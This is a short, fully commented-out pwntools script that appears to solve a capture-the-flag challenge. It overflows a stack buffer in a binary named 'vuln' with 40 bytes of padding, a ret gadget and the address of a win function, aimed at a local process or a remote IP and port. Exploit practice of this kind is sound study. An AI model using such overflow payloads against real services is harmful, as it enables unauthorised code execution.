# from pwn import *

# p = process("./vuln")
# gdb.attach(p)

# p = remote("129.241.150.119", 41000)

# exe = ELF("./vuln")
# rop = ROP(exe)

# p.recvuntil(b"Enter book to review:")
# p.sendline(b"HEI")

# offset = b"A"*40
# ret = rop.ret[0]
# win_func = 0x00401186

# payload = offset + p64(ret) + p64(win_func)

# p.recvuntil(b"Enter your review:")
# p.sendline(payload)

# p.interactive()
